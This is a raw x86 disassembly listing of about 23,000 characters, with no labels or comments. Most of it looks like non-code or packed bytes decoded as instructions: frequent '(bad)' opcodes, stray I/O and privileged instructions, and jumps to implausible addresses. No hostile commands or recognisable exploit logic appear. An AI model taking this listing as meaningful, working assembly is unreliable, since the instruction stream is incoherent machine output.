  41433b:	mov    dh,0xd6
  41433d:	and    edx,DWORD PTR [edi]
  41433f:	sar    DWORD PTR [ebp+0x6a],0x4a
  414343:	mov    ebx,0xd87b744d
  414348:	and    esp,DWORD PTR [eax-0x75]
  41434b:	and    BYTE PTR [ebx],0xd6
  41434e:	xchg   ecx,eax
  41434f:	aas    
  414350:	fidiv  DWORD PTR [esi+0x74a56e23]
  414356:	xchg   ebp,eax
  414357:	inc    dh
  414359:	neg    dl
  41435b:	dec    edi
  41435c:	mov    BYTE PTR [eax],ah
  41435e:	cmp    ah,BYTE PTR [edx-0x59495a55]
  414364:	inc    esp
  414365:	lods   al,BYTE PTR ds:[esi]
  414366:	sbb    ah,BYTE PTR [esi-0x27c79180]
  41436c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41436d:	cld    
  41436e:	push   ebx
  41436f:	scas   al,BYTE PTR es:[edi]
  414370:	cmp    esi,DWORD PTR gs:0xb49add00
  414377:	mov    bh,0xd1
  414379:	cmc    
  41437a:	xor    eax,esp
  41437c:	inc    ebp
  41437d:	or     eax,0x11ba826a
  414382:	sbb    DWORD PTR [ebp+0x2eb2d95f],edx
  414388:	call   0x55b05ed3
  41438d:	popa   
  41438e:	push   esp
  41438f:	xchg   ebx,eax
  414390:	pop    edi
  414391:	ins    DWORD PTR es:[edi],dx
  414392:	xor    al,0xa0
  414394:	test   DWORD PTR [esi-0x12],ebx
  414397:	xor    DWORD PTR [ecx-0x49492bfa],edx
  41439d:	mov    cl,0x44
  41439f:	jo     0x41441a
  4143a1:	cmp    al,0xd6
  4143a3:	retf   
  4143a4:	inc    ecx
  4143a5:	jne    0x414354
  4143a7:	jne    0x41435d
  4143a9:	sbb    esp,esi
  4143ab:	repnz mov ch,0xd0
  4143ae:	ret    
  4143af:	out    dx,eax
  4143b0:	mov    ecx,0xb6b6d808
  4143b5:	int3   
  4143b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143b7:	jbe    0x414432
  4143b9:	sbb    bl,BYTE PTR [ecx+eax*2-0x49]
  4143bd:	lods   eax,DWORD PTR ds:[esi]
  4143be:	inc    ecx
  4143bf:	aad    0x2c
  4143c1:	scas   eax,DWORD PTR es:[edi]
  4143c2:	(bad)  
  4143c6:	mov    BYTE PTR [ebx],cl
  4143c8:	or     ecx,DWORD PTR ds:0xa9429c51
  4143ce:	std    
  4143cf:	mov    esi,0xd2d41d83
  4143d4:	repnz adc eax,DWORD PTR [eax]
  4143d7:	pop    esp
  4143d8:	push   eax
  4143d9:	mov    al,ds:0x8df8c374
  4143de:	add    ch,BYTE PTR [esi]
  4143e0:	mov    ah,0x5b
  4143e2:	ins    DWORD PTR es:[edi],dx
  4143e3:	ret    
  4143e4:	mov    ecx,0xd385ace3
  4143e9:	adc    ah,bl
  4143eb:	mov    dh,0x9a
  4143ed:	(bad)  
  4143ee:	in     al,0x1
  4143f0:	push   eax
  4143f1:	jmp    0xbb56b312
  4143f6:	mov    BYTE PTR ds:0x6a9fbdb0,cl
  4143fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143fd:	sti    
  4143fe:	xchg   esi,eax
  4143ff:	dec    edx
  414400:	adc    eax,0xbb91a94d
  414405:	inc    esp
  414406:	inc    esi
  414407:	and    eax,0x2dd05c0
  41440c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41440d:	xchg   edi,eax
  41440e:	(bad)  
  41440f:	(bad)  
  414410:	push   ss
  414411:	ss mov dh,0xc2
  414414:	adc    ecx,DWORD PTR [esi-0x75ae7339]
  41441a:	cli    
  41441b:	mov    ch,0x27
  41441d:	dec    ebx
  41441e:	or     eax,0x7bee1710
  414423:	leave  
  414424:	mov    ebp,0xaa33f80d
  414429:	fcmovnbe st,st(6)
  41442b:	mov    dh,0xa6
  41442d:	imul   ebp,DWORD PTR [ebx],0xffffffdd
  414430:	bound  ecx,QWORD PTR [esi]
  414432:	pop    edi
  414433:	jmp    0xa91caed2
  414438:	push   cs
  414439:	inc    eax
  41443a:	dec    edi
  41443b:	sub    ebx,0x3705fbad
  414441:	push   0x33502f9b
  414446:	fisttp QWORD PTR [esi]
  414448:	iret   
  414449:	add    dl,BYTE PTR [ebx+ebx*2-0x29f1a8a5]
  414450:	jge    0x4144af
  414452:	or     eax,0xd6850102
  414457:	mov    dh,0x4
  414459:	mov    edx,edi
  41445b:	outs   dx,BYTE PTR ds:[esi]
  41445c:	ss push ebp
  41445e:	int    0xa1
  414460:	pop    ebp
  414461:	fcomp  st(2)
  414463:	dec    ebp
  414464:	xor    ebp,0x59eb41c2
  41446a:	pop    esi
  41446b:	ds push ebp
  41446d:	sub    eax,0x6260b550
  414472:	lods   al,BYTE PTR ds:[esi]
  414473:	push   eax
  414474:	cli    
  414475:	mov    eax,ds:0x5d11d1b8
  41447a:	jmp    0x69672f7b
  41447f:	inc    esi
  414480:	pop    ss
  414481:	shr    DWORD PTR [ebp+0x7af93506],1
  414487:	or     DWORD PTR [eax+0x29b451d2],esp
  41448d:	call   0x598f2cda
  414492:	enter  0xedb6,0x56
  414496:	fild   DWORD PTR [ebx-0x50]
  414499:	sar    esi,1
  41449b:	xchg   edi,eax
  41449c:	adc    al,0xf
  41449e:	outs   dx,BYTE PTR ds:[esi]
  41449f:	cld    
  4144a0:	adc    al,0xbd
  4144a2:	dec    edx
  4144a3:	shl    DWORD PTR [esi+0x38e8e6d5],0xcb
  4144aa:	push   es
  4144ab:	jmp    0x3b38:0xdb76c10d
  4144b2:	sahf   
  4144b3:	(bad)
  4144b8:	rcl    dl,0xb6
  4144bb:	shl    BYTE PTR [esi+0x236daa70],1
  4144c1:	and    eax,0x11dd802b
  4144c6:	pop    esp
  4144c7:	sub    BYTE PTR [ecx],dl
  4144c9:	in     eax,dx
  4144ca:	mov    gs:0x89c75944,al
  4144d0:	dec    eax
  4144d1:	or     dl,BYTE PTR [ebx-0x4b]
  4144d4:	sub    eax,0x2a624da9
  4144d9:	repz xchg esi,eax
  4144db:	jbe    0x4144e2
  4144dd:	fdiv   QWORD PTR [ebx+eiz*8+0x42c74844]
  4144e4:	jno    0x414502
  4144e6:	mov    dh,0xad
  4144e8:	add    DWORD PTR [esi],esi
  4144ea:	pusha  
  4144eb:	loop   0x4144d8
  4144ed:	add    ah,BYTE PTR [ecx-0x72942841]
  4144f3:	mov    dh,0xdd
  4144f5:	ss nop
  4144f7:	or     al,0x65
  4144f9:	enter  0x989c,0xc4
  4144fd:	ds push ecx
  4144ff:	test   eax,0x295ad575
  414504:	jmp    0xdd4715ef
  414509:	fild   DWORD PTR [edx+0x6b2f7689]
  41450f:	or     eax,0xe37efaf7
  414514:	adc    esp,DWORD PTR [ecx]
  414516:	sbb    BYTE PTR [ebx],0xb
  414519:	call   0x562c:0x2c156318
  414520:	test   DWORD PTR [edx-0x7c102853],ecx
  414526:	and    DWORD PTR [ebp-0x45],0x74dbb46d
  41452d:	aam    0xf7
  41452f:	dec    ebx
  414530:	cmp    DWORD PTR [esi+0x36],0x59
  414534:	mov    eax,ds:0x2ee629
  414539:	outs   dx,BYTE PTR ds:[esi]
  41453a:	pop    ebx
  41453b:	sbb    eax,0x85a5e042
  414540:	mov    ch,BYTE PTR [edx-0x5]
  414543:	rol    DWORD PTR [ebp+0x313d25a6],1
  414549:	adc    BYTE PTR [eax-0xb],cl
  41454c:	into   
  41454d:	mov    eax,0xa6b71a00
  414552:	lahf   
  414553:	push   ebx
  414554:	sub    DWORD PTR [esi+0x5],ecx
  414557:	js     0x414519
  414559:	mov    dh,0x6c
  41455b:	xor    al,0xe4
  41455d:	lahf   
  41455e:	loopne 0x414509
  414560:	repnz repz fiadd DWORD PTR [ebp+0x720e128d]
  414568:	fadd   QWORD PTR [esi+0x52]
  41456b:	popa   
  41456c:	xchg   BYTE PTR [eax+ebp*1+0x6c],bl
  414570:	aaa    
  414571:	dec    eax
  414572:	icebp  
  414573:	adc    ebp,DWORD PTR [esi-0x27]
  414576:	test   eax,0xd6b5169d
  41457b:	push   ebp
  41457c:	jne    0x4145e9
  41457e:	fiadd  WORD PTR ds:0x698e8e01
  414584:	shr    DWORD PTR [ebx],1
  414586:	rcl    BYTE PTR [edx-0x1d],1
  414589:	inc    ebp
  41458a:	inc    edi
  41458b:	sub    bl,BYTE PTR [ecx+ebx*1-0x59]
  41458f:	and    dh,dl
  414591:	(bad)  
  414592:	dec    edx
  414593:	ins    DWORD PTR es:[edi],dx
  414594:	ins    DWORD PTR es:[edi],dx
  414595:	ficomp DWORD PTR [ebx-0x77]
  414598:	stos   BYTE PTR es:[edi],al
  414599:	pop    ebp
  41459a:	int    0xb2
  41459c:	ins    DWORD PTR es:[edi],dx
  41459d:	ins    BYTE PTR es:[edi],dx
  41459e:	fild   DWORD PTR [esi+0x18c28b05]
  4145a4:	push   esp
  4145a5:	and    al,cl
  4145a7:	xchg   ecx,eax
  4145a8:	ins    DWORD PTR es:[edi],dx
  4145a9:	inc    edi
  4145aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ab:	loopne 0x4145e5
  4145ad:	add    DWORD PTR [ecx],ecx
  4145af:	jo     0x414538
  4145b1:	test   al,0x38
  4145b3:	or     dl,BYTE PTR [esi+0x4bd823a]
  4145b9:	mov    eax,0xe0a3df5f
  4145be:	ret    0x9956
  4145c1:	fstp   QWORD PTR [ecx+ecx*2+0x32]
  4145c5:	or     eax,esi
  4145c7:	imul   esi,DWORD PTR [edi-0x3e034926],0xfffffff5
  4145ce:	imul   ecx,DWORD PTR [esi+ebp*1-0x3d8211f6],0x6db76c01
  4145d9:	inc    eax
  4145da:	stos   BYTE PTR es:[edi],al
  4145db:	aaa    
  4145dc:	gs or  al,0xc5
  4145df:	jecxz  0x414576
  4145e1:	sub    eax,ebx
  4145e3:	outs   dx,BYTE PTR ds:[esi]
  4145e4:	dec    ebp
  4145e5:	dec    ebx
  4145e6:	in     al,0x8f
  4145e8:	sahf   
  4145e9:	popf   
  4145ea:	mov    dh,0x18
  4145ec:	mov    bh,0xcd
  4145ee:	inc    esp
  4145ef:	mov    ch,0xb1
  4145f1:	jo     0x41462f
  4145f3:	stos   DWORD PTR es:[edi],eax
  4145f4:	pop    edx
  4145f5:	mov    ah,0xe1
  4145f7:	outs   dx,BYTE PTR ds:[esi]
  4145f8:	pop    ebp
  4145f9:	adc    BYTE PTR [ebx],cl
  4145fb:	(bad)  [ecx-0x165bcea9]
  414601:	pop    ebp
  414602:	retf   
  414603:	ret    0xd6c2
  414606:	xor    eax,0xf24970ec
  41460b:	and    dl,BYTE PTR [ebx]
  41460d:	xor    esi,DWORD PTR [esi-0x7f92d2d3]
  414613:	inc    ecx
  414614:	dec    edx
  414615:	jbe    0x414646
  414617:	test   DWORD PTR [edx-0x69],edi
  41461a:	push   cs
  41461b:	outs   dx,BYTE PTR ds:[esi]
  41461c:	sbb    ecx,DWORD PTR [ebx-0x13]
  41461f:	fimul  DWORD PTR [edx+0x7d]
  414622:	xlat   BYTE PTR ds:[ebx]
  414623:	mov    WORD PTR [edx-0x3acad69c],fs
  414629:	xchg   edi,eax
  41462a:	push   ss
  41462b:	mov    edx,0xe875f302
  414630:	and    al,0x8
  414632:	push   edi
  414633:	jo     0x414698
  414635:	add    DWORD PTR [eax-0x70b01db9],ecx
  41463b:	dec    eax
  41463c:	mov    bh,0xad
  41463e:	shl    BYTE PTR [esi+0x1d],cl
  414641:	mov    esp,0xcd53a365
  414646:	adc    al,0x5c
  414648:	cwde   
  414649:	jmp    0xc1c4:0xb7a2368
  414650:	ret    0x3a96
  414653:	sbb    BYTE PTR [ebp+0x75],0xdb
  414657:	mov    BYTE PTR [ecx],dl
  414659:	jp     0x4146bb
  41465b:	call   0xa88b:0x6d04f8d9
  414662:	test   eax,0xce90d94c
  414667:	adc    al,0x5b
  414669:	shr    BYTE PTR cs:[esi+0x11],1
  41466d:	pop    esp
  41466e:	sub    BYTE PTR [edi+0x12d5b38a],cl
  414674:	bound  ebx,QWORD PTR [ebp+0x10]
  414677:	fst    QWORD PTR [edx-0x2c]
  41467a:	adc    cl,al
  41467c:	xor    DWORD PTR [ecx],ecx
  41467e:	push   esi
  41467f:	lods   eax,DWORD PTR ds:[esi]
  414680:	add    DWORD PTR [edx-0x1996be93],edi
  414686:	popf   
  414687:	mov    dl,bh
  414689:	in     eax,0xb
  41468b:	inc    esp
  41468c:	push   ecx
  41468d:	cli    
  41468e:	rcr    DWORD PTR [ecx+0x7ee334d4],1
  414694:	push   0xb6dada8d
  414699:	out    0x33,al
  41469b:	xchg   edx,eax
  41469c:	mov    eax,ds:0x3eaa73e
  4146a1:	ins    DWORD PTR es:[edi],dx
  4146a2:	or     eax,0x16d8a218
  4146a7:	rcr    BYTE PTR [edx+0x38],0xf7
  4146ab:	bound  ebx,QWORD PTR [ebx+0x28]
  4146ae:	push   ebp
  4146af:	sub    al,0x70
  4146b1:	pop    edi
  4146b2:	push   0x615b88ec
  4146b7:	jmp    0x41467f
  4146b9:	out    0x4d,eax
  4146bb:	mov    esi,0x82556b8
  4146c0:	inc    ebp
  4146c1:	pop    esp
  4146c2:	fdivr  DWORD PTR [edx+0x12b6c713]
  4146c8:	xchg   edi,eax
  4146c9:	dec    edx
  4146ca:	sub    al,0x10
  4146cc:	dec    ebx
  4146cd:	mov    al,0xd0
  4146cf:	loop   0x41471d
  4146d1:	inc    ebx
  4146d2:	ret    
  4146d3:	and    BYTE PTR [edi],dh
  4146d5:	fcomp  DWORD PTR [eiz*4-0x3301c8b3]
  4146dc:	lods   eax,DWORD PTR ds:[esi]
  4146dd:	aas    
  4146de:	sub    al,0x14
  4146e0:	mov    al,0x51
  4146e2:	mov    BYTE PTR [eax-0x75],bl
  4146e5:	xlat   BYTE PTR ds:[ebx]
  4146e6:	imul   esi,DWORD PTR [ecx-0x47291fae],0xffffffb0
  4146ed:	fsubr  QWORD PTR [esi]
  4146ef:	cmp    bh,BYTE PTR [ebx+0x3f]
  4146f2:	or     al,0xb3
  4146f4:	xlat   BYTE PTR ds:[ebx]
  4146f5:	push   DWORD PTR [eax+0x69]
  4146f8:	mov    eax,ds:0xd92a3c2b
  4146fd:	push   ss
  4146fe:	in     al,dx
  4146ff:	loope  0x4146be
  414701:	mov    dh,0x26
  414703:	push   0x8945a757
  414708:	mov    ebp,0x708f8343
  41470d:	imul   ebx,ebx,0xc7a74d8
  414713:	cld    
  414714:	sbb    bh,BYTE PTR [ebp+0x8a1c0fe]
  41471a:	mov    eax,0xa60a00d4
  41471f:	add    eax,0x636db863
  414724:	pop    ebx
  414725:	push   0xc934e08d
  41472a:	(bad)  
  41472b:	stos   DWORD PTR es:[edi],eax
  41472c:	cdq    
  41472d:	mov    ch,BYTE PTR [edi]
  41472f:	mov    dh,0x4b
  414731:	dec    ebp
  414732:	lds    edi,FWORD PTR [edi-0x55eb56fc]
  414738:	inc    edx
  414739:	pop    ebx
  41473a:	mov    ecx,0xeda17441
  41473f:	cmp    BYTE PTR [eax+0x40ecaf88],0x90
  414746:	mov    ?,WORD PTR [eax+0x5b]
  414749:	fimul  WORD PTR [edx+0x15]
  41474c:	adc    DWORD PTR [eax+0x38eb1f00],esi
  414752:	cli    
  414753:	lods   al,BYTE PTR ds:[esi]
  414754:	mov    eax,ds:0x1d417609
  414759:	leave  
  41475a:	cmp    dh,BYTE PTR [edx]
  41475c:	and    ch,BYTE PTR [edx+0x6d]
  41475f:	adc    edx,esp
  414761:	jbe    0x414764
  414763:	clc    
  414764:	dec    ebp
  414765:	ficomp WORD PTR [eax-0x48465462]
  41476b:	sub    BYTE PTR es:[esi-0x71],ch
  41476f:	dec    eax
  414770:	pop    ss
  414771:	mov    ebx,0x7ce89e25
  414776:	sub    DWORD PTR [eax+0x7],esp
  414779:	add    al,0x4
  41477b:	mov    dh,0xad
  41477d:	scas   eax,DWORD PTR es:[edi]
  41477e:	loopne 0x4147c2
  414780:	stc    
  414781:	mov    dh,0x9f
  414783:	sbb    edx,DWORD PTR [esi-0x35]
  414786:	add    BYTE PTR [edi],ch
  414788:	ret    0x34ac
  41478b:	das    
  41478c:	pop    es
  41478d:	shl    BYTE PTR [edx-0x5],0x7d
  414791:	(bad)  
  414792:	pop    edi
  414793:	gs pop edi
  414795:	cmc    
  414796:	sbb    esi,DWORD PTR [ecx-0x9b93b4b]
  41479c:	arpl   WORD PTR [ecx],cx
  41479e:	cmp    eax,0xb853797c
  4147a3:	rcl    DWORD PTR [edx-0x45],1
  4147a6:	loope  0x4147c8
  4147a8:	inc    ebp
  4147a9:	or     BYTE PTR [edi-0x7e],dh
  4147ac:	mov    eax,0x342b3a94
  4147b1:	les    ecx,FWORD PTR [esi-0x30cda277]
  4147b7:	sbb    ah,0x75
  4147ba:	and    BYTE PTR ds:0x798251a0,0x62
  4147c1:	sbb    al,0xc1
  4147c3:	lods   eax,DWORD PTR ds:[esi]
  4147c4:	test   eax,0x4c50edf1
  4147c9:	loop   0x4147a7
  4147cb:	inc    eax
  4147cc:	les    ecx,FWORD PTR [ebp+0x7b74092e]
  4147d2:	xchg   edi,eax
  4147d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d4:	imul   esp,ecx,0x76b6d6e1
  4147da:	mov    DWORD PTR [edi+0x67],esp
  4147dd:	jbe    0x414774
  4147df:	aaa    
  4147e0:	jns    0x4147ff
  4147e2:	test   DWORD PTR [ebp-0x42739c93],eax
  4147e8:	mov    eax,ds:0xc1b5db3b
  4147ed:	dec    ecx
  4147ee:	sbb    esp,DWORD PTR ds:0xe04b608
  4147f4:	shl    BYTE PTR [esi-0x7f],cl
  4147f7:	push   0x2c
  4147f9:	ins    BYTE PTR es:[edi],dx
  4147fa:	push   eax
  4147fb:	or     eax,DWORD PTR [ebx-0x63]
  4147fe:	pop    esp
  4147ff:	push   ebx
  414800:	mov    BYTE PTR [ebp-0x26],ah
  414803:	mov    BYTE PTR [eax],ch
  414805:	dec    ebx
  414806:	xor    DWORD PTR [esi-0xf],ebp
  414809:	int3   
  41480a:	fsubr  DWORD PTR [eax+0x6d]
  41480d:	and    bl,0xae
  414810:	fst    QWORD PTR [edi+0x70b0105d]
  414816:	test   eax,0x4e2b465d
  41481b:	ret    0x3a02
  41481e:	scas   al,BYTE PTR es:[edi]
  41481f:	xchg   ecx,eax
  414820:	outs   dx,BYTE PTR ds:[esi]
  414821:	or     ebx,DWORD PTR [ebx]
  414823:	ins    DWORD PTR es:[edi],dx
  414824:	pop    ss
  414825:	(bad)  
  414826:	push   esi
  414827:	mov    ebp,es
  414829:	inc    ebp
  41482a:	mov    eax,0xb04b1a3a
  41482f:	sub    eax,0x2e324d6c
  414834:	sub    al,0x14
  414836:	push   cs
  414837:	cmp    BYTE PTR [eax-0x56],dl
  41483a:	mov    dh,0x5d
  41483c:	push   esp
  41483d:	(bad)  
  41483f:	sti    
  414840:	mov    bl,0xb4
  414842:	inc    ebp
  414843:	adc    al,0x8a
  414845:	sbb    cl,BYTE PTR [ebx+0x434250af]
  41484b:	adc    BYTE PTR [eax*2+0x3afd0579],ch
  414852:	mov    dh,0x85
  414854:	jbe    0x41484f
  414856:	push   ebp
  414857:	push   eax
  414858:	add    BYTE PTR [edi+0x43cbef9a],bl
  41485e:	mov    esp,0x4b4b97a4
  414863:	lods   eax,DWORD PTR ds:[esi]
  414864:	fdiv   DWORD PTR [eax+0x7a173c9c]
  41486a:	xchg   edx,eax
  41486b:	lock adc DWORD PTR [edi+0xa5f28d],esi
  414872:	sbb    eax,0x2fce696e
  414877:	repz das 
  414879:	mov    ch,0xdb
  41487b:	push   edx
  41487c:	inc    edi
  41487d:	dec    esi
  41487e:	aaa    
  41487f:	mov    bl,0xca
  414881:	inc    ecx
  414882:	outs   dx,DWORD PTR ds:[esi]
  414883:	mov    esp,esi
  414885:	ins    DWORD PTR es:[edi],dx
  414886:	stos   DWORD PTR es:[edi],eax
  414887:	add    edi,DWORD PTR [edx+0x76d35c1a]
  41488d:	push   es
  41488e:	and    eax,0xb54cc53b
  414893:	adc    ch,BYTE PTR [ebp+0x5f4beb78]
  414899:	fdivr  DWORD PTR [ebx-0x1bf76b93]
  41489f:	iret   
  4148a0:	jl     0x414825
  4148a2:	cmp    cl,dl
  4148a4:	sti    
  4148a5:	pusha  
  4148a6:	add    DWORD PTR [esi+0x40],0xadcd1214
  4148ad:	or     DWORD PTR [edx+0x29],esp
  4148b0:	mov    ch,0xbe
  4148b2:	adc    BYTE PTR [eax-0x393bc9f5],cl
  4148b8:	(bad)  
  4148b9:	aaa    
  4148ba:	adc    edi,edi
  4148bc:	std    
  4148bd:	mov    ah,0x6a
  4148bf:	mov    ah,0x11
  4148c1:	cwde   
  4148c2:	sub    DWORD PTR [eax+0x0],0xffffffda
  4148c6:	repnz lods eax,DWORD PTR ds:[esi]
  4148c8:	pop    edi
  4148c9:	mov    dl,0x9f
  4148cb:	pop    es
  4148cc:	mov    bh,0x5
  4148ce:	inc    ebx
  4148cf:	add    al,0x94
  4148d1:	out    dx,al
  4148d2:	out    dx,eax
  4148d3:	xchg   ebx,eax
  4148d4:	mov    eax,DWORD PTR [ecx+0x3]
  4148d7:	sbb    bl,0xc2
  4148da:	sbb    BYTE PTR ds:0xca5374ed,ah
  4148e0:	pop    eax
  4148e1:	fdiv   DWORD PTR [esi+0x2aa4b6c2]
  4148e7:	(bad)  
  4148e8:	xchg   esp,eax
  4148e9:	adc    al,ah
  4148eb:	dec    eax
  4148ec:	das    
  4148ed:	popf   
  4148ee:	ins    DWORD PTR es:[edi],dx
  4148ef:	ins    DWORD PTR es:[edi],dx
  4148f0:	pop    ds
  4148f1:	fst    QWORD PTR [edi+ebx*8-0x49]
  4148f5:	and    eax,0xc17753ca
  4148fa:	mov    ecx,0xb6e82ec5
  4148ff:	xor    eax,0x3a136b54
  414904:	xchg   BYTE PTR [ecx+0xc],cl
  414907:	sub    DWORD PTR [esi+0x1b],ebp
  41490a:	dec    ebp
  41490b:	adc    bl,bh
  41490d:	ss hlt 
  41490f:	push   cs
  414910:	pop    esp
  414911:	jmp    0xb8cb771
  414916:	or     DWORD PTR [eax],0xc84a2c2b
  41491c:	jb     0x4148c5
  41491e:	mov    BYTE PTR [eax-0x45],ah
  414921:	xchg   ebp,eax
  414922:	inc    edi
  414923:	sbb    dl,BYTE PTR [esp+ebp*8+0x55b13f5f]
  41492a:	sub    al,0xc3
  41492d:	mov    ecx,0xdbd4c779
  414932:	mov    dh,0x85
  414934:	(bad)  
  414935:	outs   dx,DWORD PTR ds:[esi]
  414936:	jns    0x414946
  414938:	or     al,BYTE PTR [ebp+0x4b689f5c]
  41493e:	jge    0x414996
  414940:	inc    ebx
  414941:	shl    BYTE PTR [esi-0x15],1
  414944:	mov    WORD PTR ds:[ecx-0x18],es
  414948:	cli    
  414949:	cs mov al,0x6d
  41494c:	ins    DWORD PTR es:[edi],dx
  41494d:	in     eax,dx
  41494e:	sub    eax,0xb82fcb92
  414953:	fs cmp eax,0xf6ed44c8
  414959:	ins    DWORD PTR es:[edi],dx
  41495a:	inc    ebp
  41495b:	adc    edx,ebx
  41495d:	loopne 0x4148e7
  41495f:	ds inc ebx
  414961:	dec    esi
  414962:	out    dx,eax
  414963:	fist   DWORD PTR [eax+0x5b]
  414966:	adc    DWORD PTR [esi+0x2a],edx
  414969:	retf   0xd43d
  41496c:	jge    0x41491e
  41496e:	cld    
  41496f:	pop    edi
  414970:	pusha  
  414971:	ds faddp st(7),st
  414974:	add    BYTE PTR [ecx],bh
  414976:	jl     0x414978
  414978:	sbb    DWORD PTR [esi+0x744b4d00],esi
  41497e:	fstp   st(2)
  414980:	ins    DWORD PTR es:[edi],dx
  414981:	test   eax,0x293326bb
  414986:	mov    ecx,0x54da5926
  41498b:	push   ebp
  41498c:	or     ebx,ebx
  41498e:	(bad)  
  41498f:	ds sti 
  414991:	mov    WORD PTR ds:0x2f0f5038,gs
  414997:	(bad)
  41499a:	or     ebp,DWORD PTR [ebp*2+0x98d686c]
  4149a1:	test   BYTE PTR [edx],dh
  4149a3:	push   cs
  4149a4:	add    ebx,DWORD PTR [ebx]
  4149a6:	shr    DWORD PTR [esi+0x6c],1
  4149a9:	or     ecx,DWORD PTR [edx]
  4149ab:	icebp  
  4149ac:	adc    al,0x20
  4149ae:	arpl   WORD PTR [eax+0x6adc7113],bx
  4149b4:	sbb    eax,0x4b7552d
  4149b9:	xor    eax,0xa770f7a1
  4149be:	mov    ch,0xd0
  4149c0:	jbe    0x4149c3
  4149c2:	call   0xb54c:0x50838007
  4149c9:	mov    DWORD PTR [edx-0x45],ebp
  4149cc:	lods   eax,DWORD PTR ds:[esi]
  4149cd:	lods   eax,DWORD PTR ds:[esi]
  4149ce:	dec    ecx
  4149cf:	mov    eax,ds:0x4a9675c3
  4149d4:	or     bh,BYTE PTR [edi+0x7ab855d8]
  4149da:	mov    ch,0x15
  4149dc:	not    DWORD PTR [ecx-0x24]
  4149df:	fsubr  DWORD PTR [esi]
  4149e1:	(bad)  
  4149e3:	mov    DWORD PTR ds:0x522d06,esp
  4149e9:	out    dx,al
  4149ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149eb:	sti    
  4149ec:	(bad)  
  4149ed:	pushf  
  4149ee:	outs   dx,BYTE PTR ds:[esi]
  4149ef:	dec    edi
  4149f0:	fdivr  QWORD PTR [esi+0x21e646bd]
  4149f6:	adc    al,BYTE PTR [edi]
  4149f8:	xor    DWORD PTR [eax],edi
  4149fa:	sbb    eax,0x9ad8807f
  4149ff:	cmp    bh,0xa2
  414a02:	adc    al,0x58
  414a04:	pop    ebx
  414a05:	mov    esi,0xb305d4b1
  414a0a:	mov    bl,0xe1
  414a0c:	cmp    DWORD PTR [edx],ebx
  414a0e:	add    BYTE PTR [edi+0x53],ch
  414a11:	pop    edi
  414a12:	fimul  DWORD PTR [ebp+0x64cd76d2]
  414a18:	(bad)
  414a1c:	jbe    0x414a2d
  414a1e:	mov    ecx,0x8256edaa
  414a23:	cmp    esp,ebp
  414a25:	jb     0x4149a8
  414a27:	mov    WORD PTR [eax],es
  414a29:	fcmovnu st,st(0)
  414a2b:	fidivr DWORD PTR [edx]
  414a2d:	push   0xffffffb1
  414a2f:	das    
  414a30:	sbb    DWORD PTR [esi-0x7363e7b1],esp
  414a36:	xor    al,0xdf
  414a38:	bound  esp,QWORD PTR [ebx-0x78]
  414a3b:	sbb    edi,0xe55a7b
  414a41:	retf   0x3fb7
  414a44:	outs   dx,BYTE PTR ds:[esi]
  414a45:	dec    ebp
  414a46:	adc    DWORD PTR [ebx+0x3c5bcebe],esi
  414a4c:	ins    BYTE PTR es:[edi],dx
  414a4d:	iret   
  414a4e:	add    DWORD PTR [ecx+0x63],ebp
  414a51:	sub    ebp,DWORD PTR [ebp+eax*1+0x47]
  414a55:	shl    DWORD PTR [ebx+0x4142e781],0xdb
  414a5c:	(bad)  
  414a5d:	inc    esp
  414a5e:	jne    0x414ac9
  414a60:	cmovge ecx,DWORD PTR [bx+di-0x6179]
  414a66:	out    0xaa,al
  414a68:	lea    ebx,[ebx]
  414a6a:	or     eax,DWORD PTR [ecx]
  414a6c:	cmp    al,0xb1
  414a6e:	or     dl,cl
  414a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a71:	in     al,0x5d
  414a73:	fidiv  DWORD PTR [esi-0x529a555a]
  414a79:	xor    al,0xfe
  414a7b:	retf   0x1a5c
  414a7e:	push   0xb680b46e
  414a83:	sbb    dl,BYTE PTR [edi]
  414a85:	cwde   
  414a86:	(bad)  
  414a87:	push   ecx
  414a88:	fld    DWORD PTR [ebp-0x2f45d798]
  414a8e:	inc    edi
  414a8f:	mov    dl,0xaf
  414a91:	jns    0x414a6d
  414a93:	xor    DWORD PTR [esi+0x21169568],ebx
  414a99:	add    eax,DWORD PTR [ecx+0x3f]
  414a9c:	inc    ebx
  414a9d:	sub    eax,0x96dc4175
  414aa2:	inc    edi
  414aa3:	test   eax,0xf12aaa
  414aa8:	ficomp WORD PTR [edx-0x28]
  414aab:	outs   dx,BYTE PTR ds:[esi]
  414aac:	ins    BYTE PTR es:[edi],dx
  414aad:	sbb    al,0xe7
  414aaf:	mov    al,dl
  414ab1:	mov    eax,ds:0x9f256cc2
  414ab6:	dec    edx
  414ab7:	push   ebp
  414ab8:	mov    ebx,0x1c3dbc50
  414abd:	or     eax,0xdbb548b0
  414ac2:	out    0xd8,al
  414ac4:	xor    eax,0xccfeab1c
  414ac9:	or     edx,DWORD PTR [edx]
  414acb:	mov    dl,BYTE PTR [edx-0x4972aa30]
  414ad1:	dec    ebp
  414ad2:	aaa    
  414ad3:	pop    ss
  414ad4:	in     al,dx
  414ad5:	mov    dl,ah
  414ad7:	mov    ah,0xed
  414ad9:	stos   BYTE PTR es:[edi],al
  414ada:	mov    eax,0x5d027a85
  414adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ae0:	push   ecx
  414ae1:	xor    eax,0xdb6081d4
  414ae6:	inc    eax
  414ae7:	arpl   WORD PTR [ebp+edi*4+0xb235b08],dx
  414aee:	pusha  
  414aef:	inc    ebx
  414af0:	mov    al,0x51
  414af2:	retf   0xe13e
  414af5:	xor    eax,0x8db6375e
  414afa:	lods   eax,DWORD PTR ds:[esi]
  414afb:	mov    WORD PTR ds:0xd1d45784,ds
  414b01:	or     ebp,DWORD PTR [edx]
  414b03:	push   0xffffff93
  414b05:	outs   dx,BYTE PTR ds:[esi]
  414b06:	pop    ds
  414b07:	fcomp  QWORD PTR [edx-0x54]
  414b0a:	inc    ecx
  414b0b:	jp     0x414b00
  414b0d:	mov    dh,0x85
  414b0f:	xchg   ebp,eax
  414b10:	xchg   edi,eax
